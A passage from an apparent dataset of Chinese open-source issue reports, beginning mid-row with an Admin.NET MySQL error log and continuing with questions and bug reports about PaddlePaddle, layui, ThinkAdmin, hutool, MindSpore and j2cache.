@__p_1 OFFSET @__p_0 【时间】2021-12-26 15:20:53,701 【等级】ERR 【消息】An exception occurred while iterating over the results of a query for context type 'Admin.NET.EntityFramework.Core.DefaultDbContext'. MySqlConnector.MySqlException (0x80004005): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'longtext) AS , CAST(. AS longtext) AS , ., .,' at line 1 at MySqlConnector.Core.ServerSession.ReceiveReplyAsyncAwaited(ValueTask2 cachedProcedures, IMySqlCommand command, CommandBehavior behavior, Activity activity, IOBehavior ioBehavior, CancellationToken cancellationToken) in /</em>/src/MySqlConnector/MySqlDataReader.cs:line 450 at MySqlConnector.Core.CommandExecutor.ExecuteReaderAsync(IReadOnlyList1.AsyncEnumerator.InitializeReaderAsync(AsyncEnumerator enumerator, CancellationToken cancellationToken) at Pomelo.EntityFrameworkCore.MySql.Storage.Internal.MySqlExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func4 verifySucceeded, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerablesIdsAccountsBrowsersClassNamesElapsedTimesIpsLocationsMessagesMethodNamesNamesOpTimesOssParamsReqMethodsResultsSuccesssTenantIdsUrlsys_log_opssIdsys_log_opAccountBrowserClassNameElapsedTimeIpLocationMessageMethodNameNameOpTimeOsParamReqMethodResultSuccessTenantIdUrlIdsys_log_opIdsIdsCodesCreatedTimesCreatedUserIdsCreatedUserNamesIsDeletedsNamesRemarksSortsStatussUpdatedTimesUpdatedUserIdsUpdatedUserNamesys_dict_typessCodesIdsCodesCreatedTimesCreatedUserIdsCreatedUserNamesIsDeletedsRemarksSortsStatussTypeIdsUpdatedTimesUpdatedUserIdsUpdatedUserNamesValuesys_dict_datassys_dict_types0sTypeIds0Ids0IdsStatussSortsIdsAccountsBrowsersClassNamesElapsedTimesIpsLocationsMessagesMethodNamesNamesOpTimesOssParamsReqMethodsResultsSuccesssTenantIdsUrlsys_log_opssIdsys_log_opAccountBrowserClassNameElapsedTimeIpLocationMessageMethodNameNameOpTimeOsParamReqMethodResultSuccessTenantIdUrlIdsys_log_opIdIdsPidPidsPidssName1 task) in /<em>/src/MySqlConnector/Core/ServerSession.cs:line 910 at MySqlConnector.Core.ResultSet.ReadResultSetHeaderAsync(IOBehavior ioBehavior) in /</em>/src/MySqlConnector/Core/ResultSet.cs:line 44 at MySqlConnector.MySqlDataReader.ActivateResultSet(CancellationToken cancellationToken) in /<em>/src/MySqlConnector/MySqlDataReader.cs:line 107 at MySqlConnector.MySqlDataReader.CreateAsync(CommandListPosition commandListPosition, ICommandPayloadCreator payloadCreator, IDictionary1 commands, ICommandPayloadCreator payloadCreator, CommandBehavior behavior, Activity activity, IOBehavior ioBehavior, CancellationToken cancellationToken) in /</em>/src/MySqlConnector/Core/CommandExecutor.cs:line 56 at MySqlConnector.MySqlCommand.ExecuteReaderAsync(CommandBehavior behavior, IOBehavior ioBehavior, CancellationToken cancellationToken) in /<em>/src/MySqlConnector/MySqlCommand.cs:line 313 at MySqlConnector.MySqlCommand.ExecuteDbDataReaderAsync(CommandBehavior behavior, CancellationToken cancellationToken) in /</em>/src/MySqlConnector/MySqlCommand.cs:line 305 at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable4 operation, Func1.AsyncEnumerator.MoveNextAsync() at Microsoft.EntityFrameworkCore.EntityFrameworkQueryableExtensions.ToListAsync[TSource](IQueryable1 source, CancellationToken cancellationToken) at Furion.Extras.Admin.NET.PagedUtil.ToADPagedListAsync[TEntity](IQueryable`1 entities, Int32 pageIndex, Int32 pageSize, CancellationToken cancellationToken) in E:\CSharpProject\Admin.NET - MySql\backend\Furion.Extras.Admin.NET\Util\PagedUtil.cs:line 0 at Furion.Extras.Admin.NET.Service.SysOrgService.QueryOrgPageList(OrgPageInput input) in E:\CSharpProject\Admin.NET - MySql\backend\Furion.Extras.Admin.NET\Service\Org\SysOrgService.cs:line 56 at lambda_method1046(Closure , Object ) at Microsoft.AspNetCore.Mvc.Infrastructure.ActionMethodExecutor.AwaitableObjectResultExecutor.Execute(IActionResultTypeMapper mapper, ObjectMethodExecutor executor, Object controller, Object[] arguments) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Logged|12_1(ControllerActionInvoker invoker) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|10_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Rethrow(ActionExecutedContextSealed context) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.Next(State&amp; next, Scope&amp; scope, Object&amp; state, Boolean&amp; isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ControllerActionInvoker.g__Awaited|13_0(ControllerActionInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) at Microsoft.AspNetCore.Mvc.Infrastructure.ResourceInvoker.g__Awaited|26_0(ResourceInvoker invoker, Task lastTask, State next, Scope scope, Object state, Boolean isCompleted) 【时间】2021-12-26 15:20:54,038   <code>: s Id s Code s CreatedTime s CreatedUserId s CreatedUserName s IsDeleted s Name s Remark s Sort s Status s UpdatedTime s UpdatedUserId s UpdatedUserName sys_dict_type s s Code s Id s Code s CreatedTime s CreatedUserId s CreatedUserName s IsDeleted s Remark s Sort s Status s TypeId s UpdatedTime s UpdatedUserId s UpdatedUserName s Value sys_dict_data s sys_dict_type s0 s TypeId s0 Id s0 Id s Status s Sort s Id s Pid ParentId s Name Title s Id Value s Sort Weight sys_org s s TenantId s IsDeleted s Status s Sort sys_org s s TenantId s IsDeleted s Status Value s Sort Weight sys_org s s 2 cachedProcedures, IMySqlCommand command, CommandBehavior behavior, Activity activity, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlDataReader.cs:line 450 at MySqlConnector.Core.CommandExecutor.ExecuteReaderAsync(IReadOnlyList 1.AsyncEnumerator.InitializeReaderAsync(AsyncEnumerator enumerator, CancellationToken cancellationToken) at Pomelo.EntityFrameworkCore.MySql.Storage.Internal.MySqlExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func 4 verifySucceeded, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable s OrgType s Id Id s Pid Pid s Pids s Name s Code s Tel s Sort s Remark s Status Status sys_org s s TenantId s IsDeleted s Status s Sort Id s Pid Pid s Pids s Name 1 task) in /_/src/MySqlConnector/Core/ServerSession.cs:line 910 at MySqlConnector.Core.ResultSet.ReadResultSetHeaderAsync(IOBehavior ioBehavior) in /_/src/MySqlConnector/Core/ResultSet.cs:line 44 at MySqlConnector.MySqlDataReader.ActivateResultSet(CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlDataReader.cs:line 107 at MySqlConnector.MySqlDataReader.CreateAsync(CommandListPosition commandListPosition, ICommandPayloadCreator payloadCreator, IDictionary 1 commands, ICommandPayloadCreator payloadCreator, CommandBehavior behavior, Activity activity, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/Core/CommandExecutor.cs:line 56 at MySqlConnector.MySqlCommand.ExecuteReaderAsync(CommandBehavior behavior, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlCommand.cs:line 313 at MySqlConnector.MySqlCommand.ExecuteDbDataReaderAsync(CommandBehavior behavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlCommand.cs:line 305 at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Storage.RelationalCommand.ExecuteReaderAsync(RelationalCommandParameterObject parameterObject, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable 4 operation, Func 1.AsyncEnumerator.MoveNextAsync() 【时间】2021-12-26 15:20:53,929 【等级】INF 【消息】HTTP GET /sysDictType/dropDown?code=org_type responded 200 in 633.4355 ms 【时间】2021-12-26 15:20:53,930 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:53,933 【等级】INF 【消息】Executed DbCommand (0ms) [Parameters=[@__p_0='-2147482638'], CommandType='Text', CommandTimeout='30'] SELECT . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . FROM AS WHERE . = @__p_0 LIMIT 1 【时间】2021-12-26 15:20:53,952 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:53,970 【等级】INF 【消息】Executed DbCommand (1ms) [Parameters=[@p0='superAdmin' (Size = 50), @p1='Edge99' (Size = 100), @p2='Furion.Extras.Admin.NET.Service.SysDictTypeService' (Size = 100), @p3='73', @p4='127.0.0.1' (Size = 20), @p5='http://localhost:5566/sysDictType/dropDown?code=org_type' (Size = 1024), @p6=NULL (Size = 4000), @p7='dict-type-drop-down' (Size = 100), @p8='超级管理员' (Size = 100), @p9='2021-12-26T15:20:53.9274936+08:00' (Nullable = true), @p10='Windows10' (Size = 100), @p11='{""input"":{""code"":""org_type""}}' (Size = 4000), @p12='GET' (Size = 10), @p13='{""contentType"":null,""serializerSettings"":null,""statusCode"":null,""value"":{""success"":true,""code"":200,""message"":""请求成功"",""data"":[{""typeId"":142307070926942,""value"":""品牌"",""code"":""1"",""sort"":100,""remark"":""品牌"",""status"":0,""sysDictType"":null,""id"":142307070926946,""createdTime"":null,""updatedTime"":null,""createdUserId"":null,""createdUserName"":null,""updatedUserId"":null,""updatedUserName"":null,""isDeleted"":false},{""typeId"":142307070926942,""value"":""总店(加盟/直营)"",""code"":""2"",""sort"":100,""remark"":""总店(加盟/直营)"",""status"":0,""sysDictType"":null,""id"":142307070926947,""createdTime"":null,""updatedTime"":null,""createdUserId"":null,""createdUserName"":null,""updatedUserId"":null,""updatedUserName"":null,""isDeleted"":false},{""typeId"":142307070926942,""value"":""直营店"",""code"":""3"",""sort"":100,""remark"":""直营店"",""status"":0,""sysDictType"":null,""id"":142307070926948,""createdTime"":null,""updatedTime"":null,""createdUserId"":null,""createdUserName"":null,""updatedUserId"":null,""updatedUserName"":null,""isDeleted"":false},{""typeId"":142307070926942,""value"":""加盟店"",""code"":""4"",""sort"":100,""remark"":""加盟店"",""status"":0,""sysDictType"":null,""id"":142307070926949,""createdTime"":null,""updatedTime"":null,""createdUserId"":null,""createdUserName"":null,""updatedUserId"":null,""updatedUserName"":null,""isDeleted"":false}],""extras"":null,""timestamp"":1640503253404}}' (Size = 4000), @p14='1', @p15=NULL (DbType = Guid), @p16='/sysDictType/dropDown' (Size = 100)], CommandType='Text', CommandTimeout='30'] INSERT INTO ( , , , , , , , , , , , , , , , , ) VALUES (@p0, @p1, @p2, @p3, @p4, @p5, @p6, @p7, @p8, @p9, @p10, @p11, @p12, @p13, @p14, @p15, @p16); SELECT FROM WHERE ROW_COUNT() = 1 AND = LAST_INSERT_ID(); 【时间】2021-12-26 15:20:54,019 【等级】INF 【消息】Executed DbCommand (2ms) [Parameters=[@__input_Code_0='org_type' (Size = 50)], CommandType='Text', CommandTimeout='30'] SELECT . , . , . , . , . , . , . , . , . , . , . , . , . FROM AS WHERE . = @__input_Code_0 LIMIT 1 【时间】2021-12-26 15:20:54,020 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:54,027 【等级】INF 【消息】Executed DbCommand (4ms) [Parameters=[@__dictTypeId_0='142307070926942'], CommandType='Text', CommandTimeout='30'] SELECT . , . , . , . , . , . , . , . , . , . , . , . , . , . FROM AS INNER JOIN AS ON . = . WHERE ( . = @__dictTypeId_0) AND ( . = 0) ORDER BY . 【时间】2021-12-26 15:20:54,029 【等级】INF 【消息】Executed DbCommand (0ms) [Parameters=[@__p_0='-2147482637'], CommandType='Text', CommandTimeout='30'] SELECT . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . , . FROM AS WHERE . = @__p_0 LIMIT 1 【时间】2021-12-26 15:20:54,034 【等级】INF 【消息】Executed DbCommand (1ms) [Parameters=[@p0='superAdmin' (Size = 50), @p1='Edge99' (Size = 100), @p2='Furion.Extras.Admin.NET.Service.SysOrgService' (Size = 100), @p3='484', @p4='127.0.0.1' (Size = 20), @p5='http://localhost:5566/sysOrg/page?pageNo=1&amp;pageSize=10' (Size = 1024), @p6=NULL (Size = 4000), @p7='org-page-list' (Size = 100), @p8='超级管理员' (Size = 100), @p9='2021-12-26T15:20:54.0173098+08:00' (Nullable = true), @p10='Windows10' (Size = 100), @p11='{""input"":{""orgType"":0,""id"":null,""pid"":null,""name"":null,""searchValue"":null,""pageNo"":1,""pageSize"":10,""searchBeginTime"":null,""searchEndTime"":null,""sortField"":null,""sortOrder"":null,""descStr"":""descend"",""searchParameters"":[]}}' (Size = 4000), @p12='GET' (Size = 10), @p13='' (Size = 4000), @p14='0', @p15=NULL (DbType = Guid), @p16='/sysOrg/page' (Size = 100)], CommandType='Text', CommandTimeout='30'] INSERT INTO ( , , , , , , , , , , , , , , , , ) VALUES (@p0, @p1, @p2, @p3, @p4, @p5, @p6, @p7, @p8, @p9, @p10, @p11, @p12, @p13, @p14, @p15, @p16); SELECT FROM WHERE ROW_COUNT() = 1 AND = LAST_INSERT_ID(); 【时间】2021-12-26 15:20:54,034 【等级】INF 【消息】Entity Framework Core 6.0.1 initialized 'DefaultDbContext' using provider 'Pomelo.EntityFrameworkCore.MySql:6.0.0' with options: SensitiveDataLoggingEnabled DetailedErrorsEnabled MigrationsAssembly=Admin.NET.Database.Migrations ServerVersion 8.0.22-mysql 【时间】2021-12-26 15:20:54,036 【等级】ERR 【消息】MySqlConnector.MySqlException (0x80004005): You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near 'longtext) AS , CAST( . AS longtext) AS , . , . ,' at line 1 at MySqlConnector.Core.ServerSession.ReceiveReplyAsyncAwaited(ValueTask 2 cachedProcedures, IMySqlCommand command, CommandBehavior behavior, Activity activity, IOBehavior ioBehavior, CancellationToken cancellationToken) in /_/src/MySqlConnector/MySqlDataReader.cs:line 450 at MySqlConnector.Core.CommandExecutor.ExecuteReaderAsync(IReadOnlyList 1.AsyncEnumerator.InitializeReaderAsync(AsyncEnumerator enumerator, CancellationToken cancellationToken) at Pomelo.EntityFrameworkCore.MySql.Storage.Internal.MySqlExecutionStrategy.ExecuteAsync[TState,TResult](TState state, Func 4 verifySucceeded, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.Query.Internal.SingleQueryingEnumerable 1 source, CancellationToken cancellationToken) at Microsoft.EntityFrameworkCore.EntityFrameworkQueryableExtensions.ToListAsync[TSource](IQueryable"
Correct Copyright headers,"Fixes https://github.com/PaddlePaddle/Paddle/issues/737 ==&gt; ==&gt; The PR was generated by running the following Bash script at the root of the source tree:   <code>: Baidu Inc. PaddlePaddle Authors Reserve Reserved for i in $(du -a | cut -f 2); do if [[ -f $i ]]; then if head -n 1 $i | grep '/* Copyright (c) 2016 Baidu, Inc. All Rights Reserve.'; then sed -isubbackup 's/\/\* Copyright (c) 2016 Baidu, Inc. All Rights Reserve./\/\* Copyright (c) 2016 PaddlePaddle Authors. All Rights Reserved./' $i; fi; fi; done"
flow加载和layer.photo合并使用有冲突,"flow加载和layer.photo合并使用有冲突 如果直接再flow 的done:function(){ next() 这里调用 只用elem调用会只显示第一页的数据，动态加载数据，flow不显示 } 错误代码： 正确代码： 我这里是把数据写入到json数组里面，然后再调用，有点麻烦，不知道是不是有什么快捷的办法   <code>: layer.photo $.get(""{:url('photo/getImgList')}?page="" + page + ""&amp;label=""+label+""&amp;photo_cate_id={$cate.id}"", function (res) { //假设你的列表返回在data集合中 layui.each(res.data, function (index, item) { lis.push('&lt;img data-id=""'+item.id+'"" layer-pid=""'+item.id+'"" lay-src=""'+item.img+'"" src=""'+item.img+'"" class=""layui-col-md3 layui-col-sm6 layui-col-xs6 img"" &gt;'); }); //执行下一页渲染，第二参数为：满足“加载更多”的条件，即后面仍有分页 //pages为Ajax返回的总页数，只有当前页小于总页数的情况下，才会继续出现加载更多 next(lis.join(''), page &lt; res.last_page); layer.photos({ photos: '#imgCont' ,anim: 5 //0-6的选择，指定弹出图片动画类型，默认随机 }); }); $.get(""{:url('photo/getImgList')}?page="" + page + ""&amp;label="" + label + ""&amp;photo_cate_id={$cate.id}"", function (res) { //假设你的列表返回在data集合中 layui.each(res.data, function (index, item) { lis.push('&lt;img data-id=""' + item.id + '"" layer-pid=""' + item.id + '"" lay-src=""' + item.img + '"" src=""' + item.img + '"" class=""layui-col-md3 layui-col-sm6 layui-col-xs6 img"" &gt;'); imgList.data.push({ pid: item.id, src: item.img, }) }); next(lis.join(''), page &lt; res.last_page); $("".img"").click(function () { let index = $(this).index() imgList['start'] = index layer.photos({ photos: imgList , anim: 5 }); }) }); ```"
MobileNetV3中预测时depthwise卷积cudnn置为False，加载cudnn置为True的训练的预训练模型会报维度不匹配错误,"1.paddle版本：1.5.0 2.模型：MobileNetV3_small, 待发布 3.遇到的问题：训练MobileNetV3时，depthwise卷积cudnn置为True，但当测试训练保存的模型时该值置为False时会报维度不匹配的错误，置为True时不存在此问题。具体错误信息如下： 补充：在MobileNetV2中不存在这个现象，MobileNetV2中depthwise卷积核的大小是3x3，在MobileNetV3中除了3x3的depthwise卷积核，还有5x5的depthwise卷积核，怀疑是5x5的depthwise卷积核在use_cudnn=True和False有diff造成的。   <code>: C++ Callstacks: Enforce failed. Expected in_dims[1] == filter_dims[1] * groups, but received in_dims[1]:4 != filter_dims[1] * groups:16. The number of input channels should be equal to filter channels * groups. at [/paddle/paddle/fluid/operators/conv_op.cc:65] PaddlePaddle Call Stacks: 0 0x7ffb9f71a118p void paddle::platform::EnforceNotMet::Init&lt;std::string&gt;(std::string, char const*, int) + 360 1 0x7ffb9f71a467p paddle::platform::EnforceNotMet::EnforceNotMet(std::string const&amp;, char const*, int) + 87 2 0x7ffb9fbf9860p paddle::operators::ConvOp::InferShape(paddle::framework::InferShapeContext*) const + 5888 3 0x7ffba188620ap paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;, paddle::framework::RuntimeContext*) const + 330 4 0x7ffba1886851p paddle::framework::OperatorWithKernel::RunImpl(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) const + 529 5 0x7ffba1883bccp paddle::framework::OperatorBase::Run(paddle::framework::Scope const&amp;, boost::variant&lt;paddle::platform::CUDAPlace, paddle::platform::CPUPlace, paddle::platform::CUDAPinnedPlace, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_, boost::detail::variant::void_&gt; const&amp;) + 332 6 0x7ffba1682e66p paddle::framework::details::ComputationOpHandle::RunImpl() + 166 7 0x7ffba16487b6p paddle::framework::details::FastThreadedSSAGraphExecutor::RunOpSync(paddle::framework::details::OpHandleBase*) + 310 8 0x7ffba164740fp paddle::framework::details::FastThreadedSSAGraphExecutor::RunOp(paddle::framework::details::OpHandleBase*, std::shared_ptr&lt;paddle::framework::BlockingQueue&lt;unsigned long&gt; &gt; const&amp;, unsigned long*) + 47 9 0x7ffba16477d0p 10 0x7ffb9f954283p std::_Function_handler&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; (), std::__future_base::_Task_setter&lt;std::unique_ptr&lt;std::__future_base::_Result&lt;void&gt;, std::__future_base::_Result_base::_Deleter&gt;, void&gt; &gt;::_M_invoke(std::_Any_data const&amp;) + 35 11 0x7ffb9f7e4dd7p std::__future_base::_State_base::_M_do_set(std::function&lt;std::unique_ptr&lt;std::__future_base::_Result_base, std::__future_base::_Result_base::_Deleter&gt; ()&gt;&amp;, bool&amp;) + 39 12 0x7ffbee734973p pthread_once + 83 13 0x7ffba1642d52p 14 0x7ffb9f7e6354p ThreadPool::ThreadPool(unsigned long)::{lambda()#1}::operator()() const + 404 15 0x7ffbc31428a0p 16 0x7ffbee72f1c3p 17 0x7ffbedd5712dp clone + 109"
ThinkAdmin 下个版本的计划,新版本后台使用开源框架。 后台前端代码使用加载页面，不使用脚手架编译。 去除加载，全面转插件，懒加载需要的文件。 后台应用模块化，标准化模块数据结构，减少数据库初始化配置。 核心组件列表 当前实验性方案 在线体验地址： http://html.thinkadmin.top 源代码地址： https://gitee.com/zoujingli/ThinkAdmin/tree/html 后台模式设计： Vue + php 混合模式。 关于 UI 结构暂定如下： 关于 Element-Plus 的介绍 https://element-plus.gitee.io/zh-CN/   <code>: ThinkAdmin ElementPlus UI UI http requirejs vue vue v3.2.22 vue.router v4.0.12 vue.sfc.loader v0.8.4 vue element-plus v1.2.0-beta.3 index.html 入口文件； &gt; layout.vue 页面布局； &gt; 页面 1.vue 页面文件； &gt; 页面 2.vue 页面文件； &gt; 页面 3.vue 页面文件； ... .. .
【提问/求助】如何自定义Json工具的toBean的字段名与实体属性映射,"JDK版本： zulu openjdk 11 hutool版本： 5.67.12 有没有类似fastjson/jackson的注解或者jdbctemplate的RowMapper接口的机制或组件或特定写法来实现自定义json字段名与实体属性映射关系？ 感谢   <code>: class Entity { int i; } // json string : {""j"":1} psvm { jsonObject.toBean(Entity.class); }"
[CT][MS][ops]CSRSparseMatrixToDense， x_dense_shape 为2D参数， 没有校验,"CSRSparseMatrixToDense， x_dense_shape 为2D参数， 没有校验 / 硬件环境: /device ascend : -- MindSpore version : -- Python version : -- OS platform and distribution : -- GCC/Compiler version : (/): /mode graph test_csrsparsematrixtodense_dense_rank_exception 加一个shape rank的校验 E ValueError: build/mindspore/merge/mindspore/core/ops_merge.cc:7740 CSRSparseMatrixToDenseInferShape] For 'CSRSparseMatrixToDense', dense form of the input should have rank 2 or 3, but got 1. E The function call stack (See file '/home/wys/zhongzhi/MindSporeTest/operations/rank_0/om/analyze_fail.dat' for more details): E # 0 In file /home/wys/zhongzhi/MindSporeTest/share/ops/primitive/csrsparsematrixtodense_ops.py(18) E return self.CSRSparseMatrixToDense(x_dense_shape, x_batch_points, x_row_points, x_col_indices, x_values) E ^ /root/archiconda3/envs/wys_op/lib/python3.7/site-packages/mindspore/common/api.py:1013: ValueError   <code>: def test_csrsparsematrixtodense_dense_rank_exception(): x_dense_shape = (3, 10, 50) dtype1 = np.int32 dtype2 = np.float32 fact = CSRSparseMatrixToDenseMock(x_dense_shape, dtype1, dtype2) fact.x_dense_shape = Tensor([[3, 10, 50]], dtype=ms.int32) #with pytest.raises(ValueError): fact.forward_mindspore_impl() """""" obj.__parse_method__ = 'construct' if not hasattr(obj, obj.__parse_method__): raise AttributeError( 'The class {} dose not have method {}'.format(obj.__class__.__name__, obj.__parse_method__)) args_list = args if hasattr(obj, ""enable_tuple_broaden""): self.enable_tuple_broaden = obj.enable_tuple_broaden self._graph_executor.set_enable_tuple_broaden(self.enable_tuple_broaden) key = self._graph_executor.generate_arguments_key(args_list, self.enable_tuple_broaden) obj.arguments_key = str(key) phase = phase + '.' + str(obj.create_time) + '.' + str(id(obj)) + '.' + obj.arguments_key if phase in obj.compile_cache and self.has_compiled(phase): logger.debug(""%r graph has existed."", phase) return phase, False obj.check_names() _check_full_batch() self._set_dataset_mode(args_list) self._set_compile_cache_dep_files(phase) is_sink_mode = args and isinstance(args[0], Tensor) and args[0].virtual_flag if auto_parallel_mode and _need_to_full() and not is_sink_mode and obj.auto_parallel_compile_and_run(): args_list = _to_full_tensor(args, _get_device_num(), _get_global_rank()) enable_ge = context.get_context(""enable_ge"") self._graph_executor.set_weights_values(obj.parameters_dict()) result = self._graph_executor.compile(obj, args_list, phase, self._use_vm_mode())"
table的基础参数cols添加class属性,"很希望table的cols里添加一个class属性， 我们用的时候 目前的解决办法是用css选择器   <code>: //方法渲染： table.render({ cols: [[ //标题栏 {checkbox: true} ,{field: 'id', title: 'ID', width: 80, class:'myCell' } ,{field: 'username', title: '用户名', width: 120} ]] }); &lt;style&gt; .myCell{ padding:0; } .myCell .layui-table-cell{ heigth:50px; } .myCell .layui-table-cell img{ …… } &lt;/style&gt; td[data-field=avatar] .layui-table-cell { height: 46px; padding: 3px; }"
"如果想其中一部分二级缓存持久化,一级过期不清除二级,这里能改吗? ","private void initFromConfig(J2CacheConfig config) { SerializationUtils.init(config.getSerialization(), config.getSubProperties(config.getSerialization())); //初始化两级的缓存管理 this.holder = CacheProviderHolder.init(config, (region, key) -&gt; { //当一级缓存中的对象失效时，自动清除二级缓存中的数据 Level2Cache level2 = this.holder.getLevel2Cache(region); level2.evict(key); if (!level2.supportTTL()) { //再一次清除一级缓存是为了避免缓存失效时再次从 L2 获取到值 this.holder.getLevel1Cache(region).evict(key); } log.debug(""Level 1 cache object expired, evict level 2 cache object [{},{}]"", region, key); if (policy != null) policy.sendEvictCmd(region, key); }); 用的j2cache.cache-clean-mode: active 的主动模式 if(""active"".equals(config.getCacheCleanMode())) { isActive = true; //设置键值回调 需要redis支持键值回调 ConfigureNotifyKeyspaceEventsAction action = new ConfigureNotifyKeyspaceEventsAction(); action.config(listenerContainer.getConnectionFactory().getConnection()); listenerContainer.addMessageListener(new SpringRedisActiveMessageListener(this, namespace), topics); }else if(""blend"".equals(config.getCacheCleanMode())) { //设置键值回调 需要redis支持键值回调 ConfigureNotifyKeyspaceEventsAction action = new ConfigureNotifyKeyspaceEventsAction(); action.config(listenerContainer.getConnectionFactory().getConnection()); listenerContainer.addMessageListener(new SpringRedisActiveMessageListener(this, namespace), topics); listenerContainer.addMessageListener(new SpringRedisMessageListener(this, this.channel), new PatternTopic(this.channel)); }else { listenerContainer.addMessageListener(new SpringRedisMessageListener(this, this.channel), new PatternTopic(this.channel)); } 这块的代码是否跟initFromConfig 互相矛盾呢? 按理论说 active模式是redis过期后清除一级缓存,但是有了initFromConfig 一级缓存过期清除一次,redis过期又清除一次?这一块不太明白,希望大佬帮忙解一下疑惑,谢谢   <code>: policy = ClusterPolicyFactory.init(holder, config.getBroadcast(), config.getBroadcastProperties()); log.info(""Using cluster policy : {}"", policy.getClass().getName()); }"
【众智】【计算-GPU开发】AdaptiveAvgPool3d,"接口目录：mindspore/ops/operations/nn_ops.py x output_size Union[tuple[int], list[int]] 属性 y 对应底层算子 对应底层GPU算子AdaptiveAvgPool3d 标杆接口参考 Pytorch接口： https://pytorch.org/docs/1.8.1/generated/torch.nn.AdaptiveAvgPool3d.html?highlight=adaptiveavgpool3d#torch.nn.AdaptiveAvgPool3d 3. 异常处理 4. 算子反向 可复用AdaptiveAvgPool3dGrad算子实现   <code>: 在多个输入平面组成的输入上应用3D自适应平均池化。 class AdaptiveAvgPool3d(Primitive): REG_OP(AdaptiveAvgPool3d) .INPUT(x, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .OUTPUT(y, TensorType({DT_FLOAT, DT_FLOAT16, DT_INT8, DT_INT16, DT_UINT8, DT_INT32, DT_INT64, DT_DOUBLE})) .REQUIRED_ATTR(output_size, ListInt) .OP_END_FACTORY_REG(AdaptiveAvgPool3d)"
